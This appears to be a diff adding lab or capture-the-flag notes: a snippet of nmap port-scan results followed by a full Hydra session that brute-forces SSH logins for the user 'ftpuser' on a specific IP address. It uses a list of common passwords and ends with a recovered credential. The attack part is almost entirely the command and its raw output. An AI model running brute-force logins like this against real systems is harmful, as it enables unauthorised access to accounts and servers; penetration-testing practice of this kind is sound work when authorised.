@@ -38,3 +38,50 @@ PORT      STATE SERVICE     VERSION
 30986/tcp open  http        nginx 1.19.2
 31156/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
 31212/tcp open  http        nginx 1.19.2
+
+
+
+─[✗]─[user@parrot]─[~/Downloads]
+└──╼ $hydra -l ftpuser -P 2020-200_most_used_passwords.txt ssh://94.237.58.110:22 -t 4 -vV
+hydra -l ftpuser -P 2020-200_most_used_passwords.txt ssh://94.237.58.110:39378 -t 4 -vV
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-30 01:36:38
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 197 login tries (l:1/p:197), ~50 tries per task
+[DATA] attacking ssh://94.237.58.110:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://ftpuser@94.237.58.110:22
+[ERROR] target ssh://94.237.58.110:22/ does not support password authentication (method reply 4).
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-30 01:36:40
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 197 login tries (l:1/p:197), ~50 tries per task
+[DATA] attacking ssh://94.237.58.110:39378/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://ftpuser@94.237.58.110:39378
+[INFO] Successful, password authentication is supported by ssh://94.237.58.110:39378
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "123456" - 1 of 197 [child 0] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "123456789" - 2 of 197 [child 1] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "picture1" - 3 of 197 [child 2] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "password" - 4 of 197 [child 3] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "12345678" - 5 of 197 [child 1] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "111111" - 6 of 197 [child 2] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "123123" - 7 of 197 [child 3] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "12345" - 8 of 197 [child 0] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "1234567890" - 9 of 197 [child 1] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "senha" - 10 of 197 [child 2] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "1234567" - 11 of 197 [child 0] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "qwerty" - 12 of 197 [child 3] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "abc123" - 13 of 197 [child 1] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "Million2" - 14 of 197 [child 2] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "000000" - 15 of 197 [child 3] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "1234" - 16 of 197 [child 0] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "iloveyou" - 17 of 197 [child 1] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "aaron431" - 18 of 197 [child 2] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "password1" - 19 of 197 [child 3] (0/0)
+[ATTEMPT] target 94.237.58.110 - login "ftpuser" - pass "qqww1122" - 20 of 197 [child 0] (0/0)
+[39378][ssh] host: 94.237.58.110   login: ftpuser   password: qqww1122
+[STATUS] attack finished for 94.237.58.110 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 01:37:01
+
